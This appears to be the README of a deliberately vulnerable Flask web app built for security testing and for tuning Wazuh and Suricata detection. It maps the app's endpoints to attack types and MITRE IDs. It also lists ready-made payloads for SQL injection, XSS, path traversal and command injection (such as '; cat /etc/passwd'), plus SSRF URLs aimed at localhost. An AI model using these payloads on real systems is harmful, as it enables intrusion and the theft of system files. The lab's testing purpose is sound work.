# VulnApp - Vulnerable Web Server for Security Testing

## Quick Start

```bash
# 1. Install dependencies
pip install flask

# 2. Run the application
python app.py

# 3. Access in browser
http://localhost:5000
```

## Services Overview

| Service | Endpoint | Attack Type | MITRE ID |
|---------|----------|-------------|----------|
| Login | `/login` | Brute Force, SQL Injection | T1110, T1078, T1190 |
| Register | `/register` | Auth bypass | T1078 |
| Upload | `/upload` | Malicious File Upload | T1203 |
| Search | `/search` | SQL Injection, XSS | T1190, T1189 |
| Files | `/files/<path>` | Path Traversal | T1190 |
| Admin | `/admin` | Privilege Escalation | T1548 |
| API Users | `/api/users` | Information Disclosure | T1087 |
| API Fetch | `/api/fetch` | SSRF | T1190 |
| API Logs | `/api/logs` | Info Disclosure | T1590.002 |

## Attack Payloads

### SQL Injection (T1190, T123)
```
' OR 1=1 --
' UNION SELECT * FROM users --
admin'--
' OR ''='
```

### XSS (T1189)
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Path Traversal (T1190)
```
../../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
```

### Command Injection (T1203)
```
; cat /etc/passwd
| ls -la
`whoami`
$(id)
```

### SSRF (T1190)
```
/api/fetch?url=http://127.0.0.1:8080/admin
/api/fetch?url=http://localhost:5000/api/users
```

## Wazuh Integration

Copy `wazuh_rules.xml` to `/var/ossec/etc/rules/` and restart Wazuh.

## Suricata Integration

Copy `suricata_rules.rules` to `/etc/suricata/rules/` and update `suricata.yaml`:

```yaml
rule-files:
  - suricata_rules.rules
  - ET_open
```